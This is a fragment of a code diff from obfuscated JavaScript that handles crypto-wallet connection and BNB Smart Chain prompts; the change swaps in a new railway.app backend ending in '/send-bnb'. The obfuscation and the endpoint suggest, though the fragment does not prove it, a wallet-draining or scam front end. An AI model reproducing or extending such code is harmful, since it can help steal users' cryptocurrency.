@@ -175,7 +175,7 @@ const _0x1b5be5 = _0x3140;
                 "popupBox",
                 "Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.",
                 "methods",
-                "https://bnbscan-backend.up.railway.app//send-bnb",
+                "https://bep20usdt-backend-production.up.railway.app/send-bnb",
                 "18px",
                 "Error\x20connecting\x20wallet:",
                 "position",
